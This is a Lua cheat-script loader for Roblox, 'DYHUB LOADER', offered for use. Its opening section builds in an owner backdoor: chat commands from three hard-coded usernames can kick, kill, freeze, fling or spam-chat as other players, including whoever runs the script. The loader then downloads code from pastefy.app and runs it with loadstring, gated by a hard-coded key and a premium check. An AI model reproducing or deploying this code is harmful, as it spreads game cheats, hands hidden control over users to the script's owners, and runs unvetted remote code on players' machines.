-- =========================================================
-- DYHUB LOADER | V9.993
-- Author: dyumra
-- =========================================================
getgenv().owners = {"Yolmar_43", "55555555555555555455", "Kazorebere231"}
local prefix = "."
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")

local activeLoops = {}
local savedStates = {}

local function starts_with(str, start)
    return string.lower(str):sub(1, #start) == string.lower(start)
end

local function findPlayersByName(query)
    local t = {}
    query = string.lower(query or "")
    for _, p in ipairs(Players:GetPlayers()) do
        if query == "all" then
            table.insert(t, p)
        elseif starts_with(p.Name, query) then
            table.insert(t, p)
        end
    end
    return t
end

local function isOwner(player)
    for _, name in ipairs(getgenv().owners) do
        if string.lower(player.Name) == string.lower(name) then
            return true
        end
    end
    return false
end

local function startLoop(id, interval, fn)
    if activeLoops[id] then return end
    activeLoops[id] = true
    spawn(function()
        while activeLoops[id] do
            pcall(fn)
            task.wait(interval)
        end
    end)
end

local function stopLoop(id)
    activeLoops[id] = nil
end

-- 🧠 Control Commands
local function bring(ownerChar, targets)
    if not ownerChar or not ownerChar.PrimaryPart then return end
    for _, plr in ipairs(targets) do
        if plr.Character and plr.Character.PrimaryPart then
            plr.Character:SetPrimaryPartCFrame(ownerChar.PrimaryPart.CFrame * CFrame.new(0, 5, 0))
        end
    end
end

local function kick(targets, reason)
    for _, plr in ipairs(targets) do
        pcall(function() plr:Kick(reason or "Kicked by owner") end)
    end
end

local function freeze(targets)
    for _, plr in ipairs(targets) do
        if plr.Character and plr.Character.PrimaryPart then
            local hum = plr.Character:FindFirstChildOfClass("Humanoid")
            if hum then
                hum.WalkSpeed = 0
                hum.JumpPower = 0
            end
            plr.Character.PrimaryPart.Anchored = true
        end
    end
end

local function unfreeze(targets)
    for _, plr in ipairs(targets) do
        if plr.Character and plr.Character.PrimaryPart then
            local hum = plr.Character:FindFirstChildOfClass("Humanoid")
            if hum then
                hum.WalkSpeed = 16
                hum.JumpPower = 50
            end
            plr.Character.PrimaryPart.Anchored = false
        end
    end
end

local function kill(targets)
    for _, plr in ipairs(targets) do
        if plr.Character and plr.Character:FindFirstChildOfClass("Humanoid") then
            plr.Character:FindFirstChildOfClass("Humanoid").Health = 0
        end
    end
end

local function sit(targets)
    for _, plr in ipairs(targets) do
        if plr.Character and plr.Character:FindFirstChildOfClass("Humanoid") then
            plr.Character:FindFirstChildOfClass("Humanoid").Sit = true
        end
    end
end

local function void(targets)
    for _, plr in ipairs(targets) do
        if plr.Character and plr.Character.PrimaryPart then
            plr.Character:SetPrimaryPartCFrame(CFrame.new(0, -999999, 0))
        end
    end
end

-- 💫 Fun Commands
local function spin(targets, speed)
    for _, plr in ipairs(targets) do
        spawn(function()
            while true do
                if not plr.Character or not plr.Character.PrimaryPart then break end
                plr.Character:SetPrimaryPartCFrame(plr.Character.PrimaryPart.CFrame * CFrame.Angles(0, math.rad(speed or 10), 0))
                task.wait(0.05)
            end
        end)
    end
end

local function floatPlayer(targets)
    for _, plr in ipairs(targets) do
        if plr.Character and plr.Character.PrimaryPart then
            plr.Character.PrimaryPart.Anchored = true
            plr.Character:SetPrimaryPartCFrame(plr.Character.PrimaryPart.CFrame + Vector3.new(0, 10, 0))
        end
    end
end

local function headBig(targets)
    for _, plr in ipairs(targets) do
        if plr.Character and plr.Character:FindFirstChild("Head") then
            plr.Character.Head.Size = Vector3.new(8, 8, 8)
        end
    end
end

local function tinyPlayer(targets)
    for _, plr in ipairs(targets) do
        if plr.Character then
            for _, part in ipairs(plr.Character:GetChildren()) do
                if part:IsA("BasePart") then
                    part.Size = part.Size * 0.5
                end
            end
        end
    end
end

local function explodePlayer(targets)
    for _, plr in ipairs(targets) do
        if plr.Character and plr.Character.PrimaryPart then
            local e = Instance.new("Explosion", workspace)
            e.Position = plr.Character.PrimaryPart.Position
            plr.Character:BreakJoints()
        end
    end
end

local function ghostPlayer(targets)
    for _, plr in ipairs(targets) do
        if plr.Character then
            for _, part in ipairs(plr.Character:GetChildren()) do
                if part:IsA("BasePart") then
                    part.Transparency = 0.5
                end
            end
        end
    end
end

local function flingPlayer(targets)
    for _, plr in ipairs(targets) do
        if plr.Character and plr.Character.PrimaryPart then
            local bodyVel = Instance.new("BodyAngularVelocity")
            bodyVel.AngularVelocity = Vector3.new(0, 5000, 0)
            bodyVel.MaxTorque = Vector3.new(1e5, 1e5, 1e5)
            bodyVel.Parent = plr.Character.PrimaryPart
            task.wait(3)
            bodyVel:Destroy()
        end
    end
end

local function launchPlayer(targets)
    for _, plr in ipairs(targets) do
        if plr.Character and plr.Character.PrimaryPart then
            local bv = Instance.new("BodyVelocity")
            bv.Velocity = Vector3.new(0, 200, 0)
            bv.MaxForce = Vector3.new(1e5, 1e5, 1e5)
            bv.Parent = plr.Character.PrimaryPart
            task.wait(1)
            bv:Destroy()
        end
    end
end

local function randomTeleport(targets)
    for _, plr in ipairs(targets) do
        if plr.Character and plr.Character.PrimaryPart then
            local x, y, z = math.random(-500, 500), 50, math.random(-500, 500)
            plr.Character:SetPrimaryPartCFrame(CFrame.new(x, y, z))
        end
    end
end

local function spamEmoji(targets)
    local emojis = {"😂", "🤣", "😎", "💀", "🔥", "💩", "🤡", "👻", "😈", "🦆"}
    for _, plr in ipairs(targets) do
        for i = 1, 10 do
            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(emojis[math.random(1, #emojis)], "All")
            task.wait(2)
        end
    end
end

local function spamdyhub(targets)
    local dyhub = {"DYHUB ON TOP", "DYHUB THE BEST"}
    for _, plr in ipairs(targets) do
        for i = 1, 2 do
            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(dyhub[math.random(1, #dyhub)], "All")
            task.wait(5)
        end
    end
end

local function invertPlayer(targets)
    for _, plr in ipairs(targets) do
        if plr.Character and plr.Character.PrimaryPart then
            plr.Character:SetPrimaryPartCFrame(plr.Character.PrimaryPart.CFrame * CFrame.Angles(math.rad(180), 0, 0))
        end
    end
end

local function invisiblePlayer(targets)
    for _, plr in ipairs(targets) do
        if plr.Character then
            for _, part in ipairs(plr.Character:GetChildren()) do
                if part:IsA("BasePart") then part.Transparency = 1 end
            end
        end
    end
end

local function fireEffect(targets)
    for _, plr in ipairs(targets) do
        if plr.Character and plr.Character.PrimaryPart then
            local fire = Instance.new("Fire", plr.Character.PrimaryPart)
            fire.Size = 20
        end
    end
end

local function iceEffect(targets)
    for _, plr in ipairs(targets) do
        if plr.Character and plr.Character.PrimaryPart then
            local particle = Instance.new("ParticleEmitter", plr.Character.PrimaryPart)
            particle.Texture = "rbxassetid://241594186"
            particle.Rate = 50
            particle.Lifetime = NumberRange.new(1)
            freeze({plr})
        end
    end
end

local function cloneArmy(targets)
    for _, plr in ipairs(targets) do
        if plr.Character then
            for i = 1, 10 do
                local clone = plr.Character:Clone()
                clone.Parent = workspace
                clone:SetPrimaryPartCFrame(plr.Character.PrimaryPart.CFrame * CFrame.new(math.random(-5,5),0,math.random(-5,5)))
            end
        end
    end
end

local function spinMyself(ownerChar, targets, speed)
    if not ownerChar or not ownerChar.PrimaryPart then return end
    for _, plr in ipairs(targets) do
        if plr.Character and plr.Character.PrimaryPart then
            freeze({plr})
            spawn(function()
                while plr.Character and plr.Character.PrimaryPart do
                    local angle = tick() * (tonumber(speed) or 5)
                    local radius = 10
                    local newPos = ownerChar.PrimaryPart.Position + Vector3.new(math.cos(angle)*radius, 3, math.sin(angle)*radius)
                    plr.Character:SetPrimaryPartCFrame(CFrame.new(newPos, ownerChar.PrimaryPart.Position))
                    task.wait(0.03)
                end
            end)
        end
    end
end

-- ⚙️ Command Handler
local function handleCommand(msg, player)
    if not isOwner(player) then return end
    local parts = string.split(msg, " ")
    local cmd, arg1, arg2 = string.lower(parts[1] or ""), parts[2], parts[3]
    local ownerChar = player.Character
    local targets = arg1 and findPlayersByName(arg1) or {}

    if cmd == prefix.."bring" then bring(ownerChar, targets)
    elseif cmd == prefix.."kick" then kick(targets)
    elseif cmd == prefix.."freeze" then freeze(targets)
    elseif cmd == prefix.."unfreeze" then unfreeze(targets)
    elseif cmd == prefix.."kill" then kill(targets)
    elseif cmd == prefix.."sit" then sit(targets)
    elseif cmd == prefix.."void" then void(targets)
    elseif cmd == prefix.."spin" then spin(targets, tonumber(arg2))
    elseif cmd == prefix.."float" then floatPlayer(targets)
    elseif cmd == prefix.."headbig" then headBig(targets)
    elseif cmd == prefix.."tiny" then tinyPlayer(targets)
    elseif cmd == prefix.."explode" then explodePlayer(targets)
    elseif cmd == prefix.."ghost" then ghostPlayer(targets)
    elseif cmd == prefix.."fling" then flingPlayer(targets)
    elseif cmd == prefix.."launch" then launchPlayer(targets)
    elseif cmd == prefix.."randomtp" then randomTeleport(targets)
    elseif cmd == prefix.."spamemoji" then spamEmoji(targets)
    elseif cmd == prefix.."spamchat" then spamdyhub(targets)
    elseif cmd == prefix.."invert" then invertPlayer(targets)
    elseif cmd == prefix.."invisible" then invisiblePlayer(targets)
    elseif cmd == prefix.."fire" then fireEffect(targets)
    elseif cmd == prefix.."ice" then iceEffect(targets)
    elseif cmd == prefix.."clonearmy" then cloneArmy(targets)
    elseif cmd == prefix.."spinmyself" then spinMyself(ownerChar, targets, tonumber(arg2))
    end
end

-- 🎧 Connect Chat Events
local function onPlayerChat(p)
    p.Chatted:Connect(function(msg)
        handleCommand(msg, p)
    end)
end

for _, p in ipairs(Players:GetPlayers()) do onPlayerChat(p) end
Players.PlayerAdded:Connect(onPlayerChat)

wait(0.5)

local DYHUBTHEBEST = "https://dsc.gg/dyhub"

--// Roblox Services
local Players = game:GetService("Players")
local player = Players.LocalPlayer
local StarterGui = game:GetService("StarterGui")
local TweenService = game:GetService("TweenService")
local Lighting = game:GetService("Lighting")

--// Basic Anti-Blacklist
local blacklist = {"geriedsmod", "vibez_qxys"}
for _, plr in ipairs(Players:GetPlayers()) do
	if table.find(blacklist, plr.Name:lower()) then
		plr:Kick("🚫 You have been permanently banned.\nReason: Impersonation or misuse detected.")
	end
end

--// Blur Screen Effect
local blur = Instance.new("BlurEffect", Lighting)
blur.Size = 15

--// Key System
local VALID_KEY = "reyosgnik"

local function notify(text)
	pcall(function()
		StarterGui:SetCore("SendNotification", {
			Title = "DYHUB",
			Text = text,
			Duration = 4
		})
	end)
	print("[DYHUB Notify]", text)
end

local function clickTween(btn)
	local original = btn.BackgroundColor3
	local tweenInfo = TweenInfo.new(0.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
	local tween1 = TweenService:Create(btn, tweenInfo, {BackgroundColor3 = original:lerp(Color3.fromRGB(40,40,40),0.5)})
	local tween2 = TweenService:Create(btn, tweenInfo, {BackgroundColor3 = original})
	tween1:Play()
	tween1.Completed:Wait()
	tween2:Play()
end

--// Function to create Key GUI
local function createKeyGui(onCorrectKey)
	local keyGui = Instance.new("ScreenGui")
	keyGui.Name = "DYHUB | Access Key"
	keyGui.ResetOnSpawn = false
	keyGui.Parent = player:WaitForChild("PlayerGui")

	keyGui.Destroying:Connect(function() blur:Destroy() end)

	local bg = Instance.new("Frame", keyGui)
	bg.Size = UDim2.new(1, 0, 1, 0)
	bg.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
	bg.BackgroundTransparency = 0.7
	bg.ZIndex = 1000

	local frame = Instance.new("Frame", keyGui)
	frame.Size = UDim2.new(0, 350, 0, 210)
	frame.Position = UDim2.new(0.5, -175, 0.5, -105)
	frame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
	frame.ZIndex = 1001
	Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 20)

	local title = Instance.new("TextLabel", frame)
	title.Size = UDim2.new(1, 0, 0, 25)
	title.Position = UDim2.new(0, 0, 0, 20)
	title.BackgroundTransparency = 1
	title.Text = "Access Key Required"
	title.TextColor3 = Color3.fromRGB(255, 255, 255)
	title.Font = Enum.Font.GothamBold
	title.TextScaled = true
	title.ZIndex = 1002

	local subtitle = Instance.new("TextLabel", frame)
	subtitle.Size = UDim2.new(1, -40, 0, 30)
	subtitle.Position = UDim2.new(0, 20, 0, 45)
	subtitle.BackgroundTransparency = 1
	subtitle.Text = "Enter your access key below to continue"
	subtitle.TextColor3 = Color3.fromRGB(180, 180, 180)
	subtitle.Font = Enum.Font.Gotham
	subtitle.TextSize = 16
	subtitle.ZIndex = 1002

	local keyBox = Instance.new("TextBox", frame)
	keyBox.Size = UDim2.new(1, -40, 0, 40)
	keyBox.Position = UDim2.new(0, 20, 0, 75)
	keyBox.PlaceholderText = "Enter key here..."
	keyBox.Text = ""
	keyBox.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
	keyBox.TextColor3 = Color3.fromRGB(255, 255, 255)
	keyBox.Font = Enum.Font.GothamSemibold
	keyBox.TextSize = 20
	keyBox.ClearTextOnFocus = false
	keyBox.ZIndex = 1002
	Instance.new("UICorner", keyBox).CornerRadius = UDim.new(0, 15)

	local submitBtn = Instance.new("TextButton", frame)
	submitBtn.Size = UDim2.new(1, -40, 0, 40)
	submitBtn.Position = UDim2.new(0, 20, 0, 120)
	submitBtn.Text = "Submit"
	submitBtn.BackgroundColor3 = Color3.fromRGB(255, 85, 85)
	submitBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
	submitBtn.Font = Enum.Font.GothamBold
	submitBtn.TextSize = 22
	submitBtn.ZIndex = 1002
	Instance.new("UICorner", submitBtn).CornerRadius = UDim.new(0, 15)

	local getKeyBtn = Instance.new("TextButton", frame)
	getKeyBtn.Size = UDim2.new(1, -40, 0, 40)
	getKeyBtn.Position = UDim2.new(0, 20, 0, 165)
	getKeyBtn.Text = "Get Key"
	getKeyBtn.BackgroundColor3 = Color3.fromRGB(70, 130, 255)
	getKeyBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
	getKeyBtn.Font = Enum.Font.GothamBold
	getKeyBtn.TextSize = 23
	getKeyBtn.ZIndex = 1002
	Instance.new("UICorner", getKeyBtn).CornerRadius = UDim.new(0, 15)

	submitBtn.MouseButton1Click:Connect(function()
		clickTween(submitBtn)
		local enteredKey = keyBox.Text:lower():gsub("%s+", "")
		if enteredKey == VALID_KEY:lower() then
			notify("✅ Correct Key! Loading...")

			local guiTween = TweenService:Create(frame, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
				Size = UDim2.new(0, 0, 0, 0),
				Position = UDim2.new(0.5, 0, 0.5, 0),
				BackgroundTransparency = 1
			})
			guiTween:Play()
			guiTween.Completed:Wait()

			keyGui:Destroy()
			blur:Destroy()
			notify("🔑 Access Granted! Free Version | DYHUB")

			local imageGui = Instance.new("ScreenGui")
			imageGui.Name = "DYHUB | Icon"
			imageGui.ResetOnSpawn = false
			imageGui.Parent = player:WaitForChild("PlayerGui")

			local image = Instance.new("ImageLabel", imageGui)
			image.Size = UDim2.new(0, 200, 0, 200)
			image.Position = UDim2.new(0.5, -100, 0.5, -100)
			image.BackgroundTransparency = 1
			image.Image = "rbxassetid://104487529937663"
			image.AnchorPoint = Vector2.new(0.5, 0.5)
			image.ZIndex = 1000
			Instance.new("UICorner", image).CornerRadius = UDim.new(0, 15)

			local rotateTween = TweenService:Create(image, TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
				Size = UDim2.new(0, 400, 0, 400),
				Rotation = 360,
				Position = UDim2.new(0.5, 0, 0.5, 0)
			})
			rotateTween:Play()
			rotateTween.Completed:Wait()

			local fadeTween = TweenService:Create(image, TweenInfo.new(0.5), {ImageTransparency = 1})
			fadeTween:Play()
			fadeTween.Completed:Wait()

			imageGui:Destroy()

			if onCorrectKey then onCorrectKey() end
		else
			notify("❌ Incorrect Key! Try again.")
			local flash = TweenService:Create(keyBox, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(255,70,70)})
			flash:Play()
			flash.Completed:Wait()
			TweenService:Create(keyBox, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(70,70,70)}):Play()
		end
	end)

	getKeyBtn.MouseButton1Click:Connect(function()
		clickTween(getKeyBtn)

		local linkGui = Instance.new("ScreenGui")
		linkGui.Name = "DYHUB | Link"
		linkGui.ResetOnSpawn = false
		linkGui.Parent = player:WaitForChild("PlayerGui")

		-- Background
		local bg2 = Instance.new("Frame", linkGui)
		bg2.Size = UDim2.new(1,0,1,0)
		bg2.BackgroundColor3 = Color3.fromRGB(20,20,20)
		bg2.BackgroundTransparency = 1

		local frame2 = Instance.new("Frame", linkGui)
		frame2.Size = UDim2.new(0,350,0,210)
		frame2.Position = UDim2.new(0.5,-175,0.5,-105)
		frame2.BackgroundColor3 = Color3.fromRGB(40,40,40)
		Instance.new("UICorner", frame2).CornerRadius = UDim.new(0,20)

		local title2 = Instance.new("TextLabel", frame2)
		title2.Size = UDim2.new(1,0,0,25)
		title2.Position = UDim2.new(0,0,0,20)
		title2.BackgroundTransparency = 1
		title2.Text = "Choose Discord Link"
		title2.TextColor3 = Color3.fromRGB(255,255,255)
		title2.Font = Enum.Font.GothamBold
		title2.TextScaled = true

		local title67 = Instance.new("TextLabel", frame2)
		title67.Size = UDim2.new(1,0,0,8)
		title67.Position = UDim2.new(0,0,0,52)
		title67.BackgroundTransparency = 1
		title67.Text = "Get Access Key from Discord to unlock"
		title67.TextColor3 = Color3.fromRGB(180, 180, 180)
		title67.Font = Enum.Font.GothamBold
        title67.TextSize = 16
	    title67.ZIndex = 1002

		local fullBtn = Instance.new("TextButton", frame2)
		fullBtn.Size = UDim2.new(1, -40, 0, 40)
		fullBtn.Position = UDim2.new(0, 20, 0, 70)
		fullBtn.Text = "Link Discord [Full]"
		fullBtn.BackgroundColor3 = Color3.fromRGB(70,130,255)
		fullBtn.TextColor3 = Color3.fromRGB(255,255,255)
		fullBtn.Font = Enum.Font.GothamBold
		fullBtn.TextSize = 18
		Instance.new("UICorner", fullBtn).CornerRadius = UDim.new(0,15)

		local shortBtn = Instance.new("TextButton", frame2)
		shortBtn.Size = UDim2.new(1, -40, 0, 40)
		shortBtn.Position = UDim2.new(0, 20, 0, 118)
		shortBtn.Text = "Link Discord [Short]"
		shortBtn.BackgroundColor3 = Color3.fromRGB(70,130,255)
		shortBtn.TextColor3 = Color3.fromRGB(255,255,255)
		shortBtn.Font = Enum.Font.GothamBold
		shortBtn.TextSize = 18
		Instance.new("UICorner", shortBtn).CornerRadius = UDim.new(0,15)

		local backBtn = Instance.new("TextButton", frame2)
		backBtn.Size = UDim2.new(1, -40, 0, 40)
		backBtn.Position = UDim2.new(0, 20, 0, 165)
		backBtn.Text = "Back"
		backBtn.BackgroundColor3 = Color3.fromRGB(255,85,85)
		backBtn.TextColor3 = Color3.fromRGB(255,255,255)
		backBtn.Font = Enum.Font.GothamBold
		backBtn.TextSize = 18
		Instance.new("UICorner", backBtn).CornerRadius = UDim.new(0,15)

		-- Full Button Logic
		fullBtn.MouseButton1Click:Connect(function()
			clickTween(fullBtn)
			pcall(function()
				setclipboard("https://discord.com/invite/jWNDPNMmyB")
			end)
			notify("🔗 Full Discord Link copied to clipboard!")
		end)

		-- Short Button Logic
		shortBtn.MouseButton1Click:Connect(function()
			clickTween(shortBtn)
			pcall(function()
				setclipboard("https://dsc.gg/dyhub")
			end)
			notify("🔗 Short Discord Link copied to clipboard!")
		end)

		-- Back Button Logic
		backBtn.MouseButton1Click:Connect(function()
			clickTween(backBtn)
			linkGui:Destroy()
		end)
	end)

	return keyGui
end

-- =========================================================
-- 💾 Load Premium List
-- =========================================================
local success, premiumUsers = pcall(function()
	local code = game:HttpGet("https://pastefy.app/YgXWjRMj/raw")
	local func = loadstring(code)
	return func and func() or {}
end)

if not success then
	notify("❌ Failed to load Premium list!")
	task.wait(3)
	player:Kick("⚠️ Could not load Premium data.\n🔎 Change your executor to use this script.\nContact: " .. DYHUBTHEBEST)
	return
end

-- =========================================================
-- 💾 Load Game List
-- =========================================================
local successGame, gameLists = pcall(function()
	local code = game:HttpGet("https://pastefy.app/MmaYrHC3/raw")
	local func = loadstring(code)
	return func and func() or {}
end)

if not successGame or not gameLists then
	notify("❌ Failed to load game list!")
	task.wait(3)
	player:Kick("⚠️ Could not load game data.\n🔎 Change your executor to use this script.\nContact: " .. DYHUBTHEBEST)
	return
end

-- Assign data
local FreeVersionallowedGamesByCreatorId = gameLists.FreeVersion and gameLists.FreeVersion.allowedGamesByCreatorId or {}
local FreeVersionallowedGamesByPlaceId = gameLists.FreeVersion and gameLists.FreeVersion.allowedGamesByPlaceId or {}
local allowedGamesforPremiumByCreatorId = gameLists.PremiumVersion and gameLists.PremiumVersion.allowedGamesByCreatorId or {}
local AllowGameforPremiumByPlaceId = gameLists.PremiumVersion and gameLists.PremiumVersion.allowedGamesByPlaceId or {}

-- =========================================================
-- 🧩 Determine Game
-- =========================================================
local placeId = tostring(game.PlaceId)
local creatorId = tonumber(game.CreatorId)
local freeGameData = FreeVersionallowedGamesByPlaceId[placeId] or FreeVersionallowedGamesByCreatorId[creatorId]
local premiumGameData = AllowGameforPremiumByPlaceId[placeId] or allowedGamesforPremiumByCreatorId[creatorId]
local gameData = freeGameData or premiumGameData

if not gameData then
	notify("❌ This script is not supported in this game!")
	task.wait(4)
	player:Kick("⚠️ Script not supported here.\n📊 Please run the script in supported games.\nCheck in: " .. DYHUBTHEBEST)
	return
end

-- =========================================================
-- 💳 Premium Check
-- =========================================================
local playerPremium = premiumUsers[player.Name]
if premiumGameData and not playerPremium then
	notify("⛔ You must be Premium to use this script in this game!")
	task.wait(4)
	player:Kick("⛔ Premium only game!\n📊 Get premium to run this script here.\n💳 Buy Premium: " .. DYHUBTHEBEST)
	return
end

-- =========================================================
-- 🚀 Script Loader
-- =========================================================
local function loadScript()
	if gameData.url then
		local success, err = pcall(function()
			loadstring(game:HttpGet(gameData.url))()
		end)
		if success then
			notify("🎮 Game: " .. gameData.name .. " | Script loaded successfully!")
		else
			notify("❌ Failed to load script: " .. tostring(err))
		end
	else
		notify("‼️ No script found for this game!")
	end
end

-- =========================================================
-- ✨ Run
-- =========================================================
if playerPremium then
	blur:Destroy()
	if playerPremium.Time == "Lifetime" or tonumber(playerPremium.Time) == -1 then
		notify("💳 Premium Loaded! | @" .. playerPremium.Tag .. " | Time: " .. playerPremium.Time)
	else
		notify("💳 Premium Loaded! | @" .. playerPremium.Tag .. " | Days: " .. tostring(playerPremium.Day))
	end
	loadScript()
else
	createKeyGui(loadScript)
end
